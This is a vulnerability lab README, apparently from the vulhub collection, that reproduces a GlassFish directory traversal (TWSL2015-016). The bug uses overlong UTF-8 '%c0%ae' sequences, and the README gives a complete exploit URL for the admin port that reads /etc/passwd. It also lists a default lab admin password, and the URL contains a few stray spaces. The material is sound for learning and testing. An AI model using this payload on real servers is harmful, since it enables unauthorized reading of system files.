# GlassFish Arbitrary File Read Vulnerability

## Principle

Reference article: https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904

The java language will parse `%c0%ae` to `\uC0AE` and finally escape the `.` (dot) of the ASCCII character. Use `%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/` to jump up to achieve directory traversal and arbitrary file reading.

## Vulnerability recurrence

Compile and run the test environment

```
Docker-compose build
Docker-compose up -d
```

After the environment is running, visit `http://your-ip:8080` and `http://your-ip:4848` to view the web page. Among them, port 8080 is the website content, and port 4848 is the GlassFish management center.

Visit `https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae% C0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/% C0%ae%c0%ae/etc/passwd`, found that the `/etc/passwd` content has been successfully read:

![](1.png)

## Extra instructions

This environment super administrator password is set in `docker-compose.yml`, the default is `vulhub_default_password`, which can be used to log in to the administrator account on port 4848.